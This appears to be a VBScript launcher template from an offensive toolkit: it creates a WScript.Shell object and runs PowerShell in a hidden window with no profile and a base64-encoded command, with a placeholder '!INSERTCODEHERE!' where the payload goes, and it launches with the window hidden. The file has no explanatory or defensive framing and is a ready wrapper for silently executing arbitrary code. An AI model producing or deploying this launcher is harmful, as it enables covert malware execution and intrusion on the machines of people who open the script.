Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
command = "powershell -noP -sta -w 1 -enc !INSERTCODEHERE!"
objShell.Run command,0
Set objShell = Nothing
